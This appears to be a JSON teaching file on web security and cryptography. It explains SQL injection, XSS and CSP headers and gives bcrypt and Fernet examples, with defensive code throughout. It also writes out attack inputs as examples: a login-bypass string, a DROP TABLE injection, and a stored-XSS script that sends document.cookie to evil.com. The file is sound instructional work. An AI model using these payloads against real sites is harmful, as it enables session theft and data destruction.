@@ -1,0 +1,80 @@
+{
+  "domain": "Cybersecurity & Ethical Hacking",
+  "category": "cybersecurity",
+  "subcategory": "ethical_hacking",
+  "description": "Complete cybersecurity knowledge for educational purposes - learn how systems are secured and how to defend them. This is for UNDERSTANDING security, not for attacking systems without permission.",
+  "disclaimer": "This knowledge is provided for EDUCATIONAL PURPOSES ONLY. All techniques shown are for understanding security to better defend systems. Never use these techniques against systems you don't own or have explicit written permission to test. Unauthorized access is illegal and unethical.",
+  "teaching_plan": {
+    "lesson_1": {
+      "title": "How Hackers Think",
+      "concepts": ["The hacker mindset", "Security vs convenience tradeoff", "Attack surface", "Defense in depth"],
+      "projects": ["Map the attack surface of a website you own", "Set up a basic firewall"]
+    },
+    "lesson_2": {
+      "title": "Web Security Basics",
+      "concepts": ["SQL injection", "XSS", "CSRF", "How to prevent each"],
+      "projects": ["Secure a vulnerable web app (educational lab)", "Set up Content Security Policy"]
+    },
+    "lesson_3": {
+      "title": "Network Defense",
+      "concepts": ["Firewalls", "IDS/IPS", "VPNs", "Network segmentation"],
+      "projects": ["Configure iptables/nftables", "Set up a home lab network"]
+    },
+    "lesson_4": {
+      "title": "Cryptography for Everyone",
+      "concepts": ["Encryption vs hashing", "HTTPS/TLS", "Password hashing", "Digital signatures"],
+      "projects": ["Encrypt a file with AES", "Set up HTTPS with Let's Encrypt"]
+    }
+  },
+  "sections": [
+    {
+      "name": "Web Security & OWASP Top 10",
+      "difficulty": "intermediate",
+      "explanation_simple": "Web security is about protecting websites and web apps from attackers. The OWASP Top 10 is the most important list of web security risks - think of it as 'the top 10 ways websites get hacked'. If you're building a web app, you MUST know these. The big ones are: SQL Injection (hackers can read your database), XSS (hackers can run JavaScript in your users' browsers), and CSRF (hackers can make your users do things without knowing). Each one has a simple fix once you know about it.",
+      "key_concepts": [
+        "SQL Injection: Attacker puts SQL code in input fields to steal/modify database data",
+        "XSS (Cross-Site Scripting): Attacker injects JavaScript that runs in other users' browsers",
+        "CSRF (Cross-Site Request Forgery): Attacker tricks users into performing actions unknowingly",
+        "SSRF (Server-Side Request Forgery): Attacker makes server send requests to internal systems",
+        "IDOR (Insecure Direct Object Reference): Accessing other users' data by changing an ID number",
+        "CSP (Content Security Policy): HTTP header that prevents XSS",
+        "CORS (Cross-Origin Resource Sharing): Controls which websites can access your API",
+        "Rate Limiting: Blocking IPs that make too many requests (prevents brute force)",
+        "Input Validation: Never trust user input - ALWAYS validate and sanitize"
+      ],
+      "code_examples": [
+        {
+          "title": "SQL Injection Demonstration (Educational)",
+          "code": "# EDUCATIONAL EXAMPLE - Understanding SQL injection for defense\n# NEVER try these on any system without permission\n\n\"\"\"\nHOW SQL INJECTION WORKS:\n\nA vulnerable login query:\n  SELECT * FROM users WHERE username='[INPUT]' AND password='[INPUT]'\n\nNormal input: username = \"alice\", password = \"secret123\"\n  SELECT * FROM users WHERE username='alice' AND password='secret123'\n  -> Returns Alice's record (if password matches)\n\nMalicious input: username = \"admin' --\", password = \"anything\"\n  SELECT * FROM users WHERE username='admin' --' AND password='anything'\n  -> The -- comments out the password check!\n  -> Returns admin's record WITHOUT knowing the password\n\nEven worse: username = \"'; DROP TABLE users; --\"\n  -> Deletes the entire users table!\n\"\"\"\n\n# HOW TO DEFEND: Use parameterized queries (NEVER string concatenation)\n\n# VULNERABLE (DON'T DO THIS):\ndef login_vulnerable(username, password):\n    query = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"\n    # If username = \"admin' --\", this becomes:\n    # SELECT * FROM users WHERE username='admin' --' AND password='...'\n    # The attacker is logged in as admin!\n    return execute_query(query)\n\n# SECURE (DO THIS INSTEAD):\ndef login_secure(username, password):\n    query = \"SELECT * FROM users WHERE username = ? AND password = ?\"\n    # The database treats username and password as DATA, not code\n    # Even if username = \"admin' --\", it's treated as a literal string\n    return execute_parameterized_query(query, (username, password))\n\n# In Python with SQLite:\nimport sqlite3\n\ndef secure_login(db_path, username, password):\n    conn = sqlite3.connect(db_path)\n    cursor = conn.cursor()\n    \n    # NEVER DO THIS:\n    # cursor.execute(f\"SELECT * FROM users WHERE username='{username}'\")\n    \n    # ALWAYS DO THIS (parameterized query):\n    cursor.execute(\n        \"SELECT * FROM users WHERE username = ? AND password = ?\",\n        (username, password)\n    )\n    \n    return cursor.fetchone()\n\n# DEFENSE SUMMARY:\n# 1. Use parameterized queries (or ORM) - ALWAYS\n# 2. Validate input types (is it a number? string? email?)\n# 3. Least privilege - database account should only be able to read/write what it needs\n# 4. WAF (Web Application Firewall) for extra protection layer\nprint(\"SQL Injection educational example loaded.\")\nprint(\"Defense: Always use parameterized queries, never string concatenation.\")"
+        },
+        {
+          "title": "XSS Prevention (Educational)",
+          "code": "# EDUCATIONAL EXAMPLE - Understanding XSS for defense\n\n\"\"\"\nXSS (Cross-Site Scripting) allows attackers to run JavaScript\nin other users' browsers. This can steal cookies, redirect to\nphishing sites, or perform actions as the victim.\n\nTYPES:\n1. Stored XSS: Malicious script saved in database (e.g., forum post)\n2. Reflected XSS: Script in URL, reflected back in response (e.g., search)\n3. DOM-based XSS: Client-side JavaScript modifies DOM unsafely\n\nExample attack (stored):\n  User posts a comment with:\n  <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>\n  \n  When anyone views the comment, their cookies are stolen!\n\"\"\"\n\n# DEFENSE - Content Security Policy (CSP)\n# Set this HTTP header to prevent XSS:\n# Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com\n\ndef set_csp_headers(response):\n    \"\"\"Set security headers to prevent XSS.\"\"\"\n    response.headers['Content-Security-Policy'] = \\\n        \"default-src 'self'; \" \\\n        \"script-src 'self' https://cdn.example.com; \" \\\n        \"style-src 'self' 'unsafe-inline'; \" \\\n        \"img-src 'self' data: https:; \" \\\n        \"font-src 'self' https://fonts.googleapis.com; \" \\\n        \"object-src 'none'; \" \\\n        \"frame-ancestors 'none'; \" \\\n        \"base-uri 'self'\"\n    response.headers['X-Content-Type-Options'] = 'nosniff'\n    response.headers['X-Frame-Options'] = 'DENY'\n    response.headers['X-XSS-Protection'] = '1; mode=block'\n    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'\n    return response\n\n# DEFENSE - Output Encoding (escape user content before displaying)\nimport html\n\ndef display_comment(comment_text):\n    \"\"\"Safely display user-generated content.\"\"\"\n    # html.escape converts < to &lt; and > to &gt;\n    # This prevents the browser from treating it as HTML/JavaScript\n    safe_text = html.escape(comment_text)\n    return f\"<div class='comment'>{safe_text}</div>\"\n\n# In JavaScript/React:\nfunction SafeComment({ text }) {\n    // React auto-escapes by default! React is XSS-resistant\n    return <div className=\"comment\">{text}</div>;\n}\n\nprint(\"XSS educational example loaded.\")\nprint(\"Defenses: CSP headers, output encoding, React auto-escaping.\")"
+        }
+      ],
+      "learning_path": "OWASP Top 10 -> SQL injection -> XSS -> CSRF -> Authentication flaws -> CSP headers -> Secure coding practices -> Bug bounties (ethical)"
+    },
+    {
+      "name": "Cryptography & Network Security",
+      "difficulty": "intermediate",
+      "explanation_simple": "Cryptography is the art of keeping secrets in a digital world. It's how your browser talks securely to websites (HTTPS), how WhatsApp messages are kept private, and how passwords are stored safely. There are two main types: symmetric encryption (same key to lock and unlock, like a house key) and asymmetric encryption (two different keys - one public to lock, one private to unlock, like a mailbox). Hashing is different - it's a one-way process that can't be reversed, used for storing passwords and verifying data integrity.",
+      "key_concepts": [
+        "Symmetric Encryption: AES (Advanced Encryption Standard) - fast, same key to encrypt/decrypt",
+        "Asymmetric Encryption: RSA, ECC - public/private key pair, used for HTTPS",
+        "Hashing: SHA-256, bcrypt - one-way, can't be reversed (password storage)",
+        "HTTPS/TLS: The protocol that secures web traffic (padlock in browser)",
+        "Certificate: Proves a website is who it says it is",
+        "Digital Signature: Proves a message came from you and wasn't changed",
+        "Perfect Forward Secrecy: Past messages stay secret even if key is compromised",
+        "Zero Trust: Never trust, always verify (modern security model)"
+      ],
+      "code_examples": [
+        {
+          "title": "Python Cryptography Examples (Educational)",
+          "code": "# EDUCATIONAL - Cryptography examples for understanding security\n\nfrom cryptography.fernet import Fernet\nimport hashlib\nimport bcrypt\n\n# 1. SYMMETRIC ENCRYPTION (AES)\n# Same key encrypts and decrypts\nprint(\"=== SYMMETRIC ENCRYPTION (AES) ===\")\n\n# Generate a key\nkey = Fernet.generate_key()\ncipher = Fernet(key)\n\n# Encrypt a message\nmessage = b\"This is secret game data\"\nencrypted = cipher.encrypt(message)\nprint(f\"Original: {message}\")\nprint(f\"Encrypted: {encrypted}\")\n\n# Decrypt\ndecrypted = cipher.decrypt(encrypted)\nprint(f\"Decrypted: {decrypted}\")\nprint(f\"Key (SAVE THIS!): {key}\")\nprint()\n\n# 2. PASSWORD HASHING (bcrypt)\n# One-way - can't get password back from hash\n# Slow by design (to prevent brute force)\nprint(\"=== PASSWORD STORAGE (bcrypt) ===\")\n\npassword = b\"my_secure_password123\"\n\n# Hash password (salt is automatically included)\nhash = bcrypt.hashpw(password, bcrypt.gensalt())\nprint(f\"Password: {password}\")\nprint(f\"Hash: {hash}\")\n\n# Check password (verify against stored hash)\nentered_password = b\"my_secure_password123\"\nis_correct = bcrypt.checkpw(entered_password, hash)\nprint(f\"Password correct: {is_correct}\")\n\nentered_password_wrong = b\"wrong_password\"\nis_correct = bcrypt.checkpw(entered_password_wrong, hash)\nprint(f\"Wrong password correct: {is_correct}\")\nprint()\n\n# 3. HASHING for data integrity\n# SHA-256 produces a fixed-size fingerprint of data\nprint(\"=== DATA INTEGRITY (SHA-256) ===\")\n\ndata = b\"This save file should not be tampered with\"\nchecksum = hashlib.sha256(data).hexdigest()\nprint(f\"Data: {data}\")\nprint(f\"SHA-256: {checksum}\")\n\n# Even a small change produces a completely different hash\ndata2 = b\"This save file should not be tampered with.\"  # Added period\nchecksum2 = hashlib.sha256(data2).hexdigest()\nprint(f\"\\nData2: {data2}\")\nprint(f\"SHA-256: {checksum2}\")\nprint(f\"Hashes match: {checksum == checksum2}\")\n\nprint(\"\\nDefense summary:\")\nprint(\"- Use bcrypt/argon2 for passwords (NOT MD5 or SHA)\")\nprint(\"- Use TLS for all network traffic\")\nprint(\"- Use encryption at rest for sensitive data\")\nprint(\"- Hash important files to detect tampering\")"
+        }
+      ],
+      "learning_path": "Symmetric encryption basics (AES) -> Hashing (SHA-256) -> Password hashing (bcrypt) -> Asymmetric encryption (RSA) -> TLS/HTTPS -> Digital signatures -> Certificate management"
+    }
+  ]
+}
